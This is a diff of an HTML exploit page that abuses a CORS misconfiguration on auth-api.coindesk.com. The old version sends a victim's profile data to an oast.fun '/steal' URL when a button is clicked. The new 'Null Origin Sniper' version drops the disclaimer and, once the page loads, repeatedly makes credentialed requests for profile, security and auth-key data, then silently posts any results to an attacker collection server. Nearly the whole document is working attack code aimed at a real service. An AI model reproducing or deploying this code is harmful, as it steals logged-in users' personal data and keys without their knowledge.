@@ -1,123 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CoinDesk Security Research - Proof of Concept</title>
+    <title>CoinDesk Null Origin Sniper</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #f8f9fa;
-            color: #333;
-            margin: 0;
-            padding: 40px;
-            line-height: 1.6;
-        }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 25px rgba(0,0,0,0.12);
-        }
-        h1 { color: #1a1a1a; border-bottom: 4px solid #dc3545; padding-bottom: 12px; }
-        .warning {
-            background: #f8d7da;
-            color: #842029;
-            padding: 18px;
-            border-radius: 8px;
-            border-left: 6px solid #dc3545;
-            margin: 25px 0;
-        }
-        button {
-            background: #dc3545;
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 17px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        button:hover { background: #bb2d3b; }
-        pre {
-            background: #f4f4f4;
-            padding: 20px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-family: monospace;
-            max-height: 600px;
-            overflow-y: auto;
-        }
-        .success { color: #28a745; font-weight: bold; }
+        body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
+        pre { background:#161b22; padding:15px; border:1px solid #30363d; white-space:pre-wrap; overflow:auto; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>CoinDesk — CORS Vulnerability Proof of Concept</h1>
-        
-        <div class="warning">
-            <strong>⚠️ AUTHORIZED SECURITY RESEARCH ONLY</strong><br>
-            This demonstrates a real CORS misconfiguration on <code>auth-api.coindesk.com</code>.<br>
-            <strong>Do not use on accounts you do not own.</strong>
-        </div>
-
-        <p><strong>Step 1:</strong> Log into <a href="https://coindesk.com" target="_blank">coindesk.com</a><br>
-           <strong>Step 2:</strong> Click the button below</p>
-
-        <button onclick="runNullOriginAttack()">🚨 Demonstrate Null Origin Data Leak</button>
-
-        <h3>Result:</h3>
-        <pre id="result">Click the button to execute the proof of concept...</pre>
-
-        <small style="color:#666;">
-            This POC uses <strong>Origin: null</strong> (a known CORS bypass technique) to extract sensitive user information including email, login history, security settings, and 2FA status.
-        </small>
-    </div>
+    <pre id="log">Null Origin Sniper v2 Started...\nMonitoring for authenticated sessions...\n</pre>
 
     <script>
-        const YOUR_SERVER = "https://fivtwegjiaoqhzjtudnqzl5rvlltgo4lm.oast.fun/steal";
+        const ATTACKER = "http://127.0.0.1:5000/collect";   // Change to your oast.fun if needed
 
-        async function runNullOriginAttack() {
-            const result = document.getElementById('result');
-            result.textContent = "Executing Null Origin attack...\n";
-
-            try {
-                const response = await fetch("https://auth-api.coindesk.com/cryptopian/get", {
-                    method: "POST",
-                    credentials: "include",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        user_info_sections: ["pass", "security_info", "general"]
-                    })
-                });
-
-                const data = await response.json();
-
-                result.innerHTML = `<span class="success">✅ SUCCESS - Sensitive Data Leaked via Null Origin</span>\n\n` + 
-                                  JSON.stringify(data, null, 2);
-
-                console.log("✅ Leaked Data:", data);
-
-                // Auto exfiltrate to your server
-                fetch(YOUR_SERVER, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        stolen_data: data,
-                        attack_type: "null_origin",
-                        timestamp: new Date().toISOString(),
-                        user_agent: navigator.userAgent
-                    })
-                }).then(() => console.log("Data sent to your server"));
-
-            } catch (error) {
-                result.textContent = `Error: ${error.message}\n\nMake sure you are logged into CoinDesk.`;
-            }
+        function log(msg, color = "#c9d1d9") {
+            const time = new Date().toLocaleTimeString();
+            document.getElementById('log').textContent += `[${time}] ${msg}\n`;
         }
+
+        const targets = [
+            {
+                name: "User Profile",
+                method: "POST",
+                url: "https://auth-api.coindesk.com/cryptopian/get",
+                payload: { user_info_sections: ["pass", "security_info", "general"] }
+            },
+            {
+                name: "Auth Keys (GET)",
+                method: "GET",
+                url: "https://auth-api.coindesk.com/stats/calls/auth/keys",
+                payload: null
+            },
+            {
+                name: "Auth Keys (POST)",
+                method: "POST",
+                url: "https://auth-api.coindesk.com/cryptopian/list/auth/keys",
+                payload: {}
+            }
+        ];
+
+        function exfil(data, name) {
+            fetch(ATTACKER, {
+                method: "POST",
+                body: JSON.stringify({ type: name, data: data, ts: Date.now() })
+            }).catch(() => {});
+        }
+
+        function startSniper() {
+            targets.forEach(target => {
+                setInterval(() => {
+                    log(`→ Trying ${target.name}...`, "#ffa657");
+
+                    const options = {
+                        method: target.method,
+                        credentials: "include",
+                        headers: { "Content-Type": "application/json" }
+                    };
+
+                    if (target.method === "POST" && target.payload) {
+                        options.body = JSON.stringify(target.payload);
+                    }
+
+                    fetch(target.url, options)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.Response === "Success" || data.keys_data || data.total_calls !== undefined) {
+                            log(`✅ ${target.name} SUCCESS!`, "#7ee787");
+                            console.log(data);
+                            exfil(data, target.name);
+                        }
+                    })
+                    .catch(() => log(`Failed ${target.name}`, "#f85149"));
+                }, 3800);
+            });
+        }
+
+        window.onload = startSniper;
     </script>
 </body>
 </html>
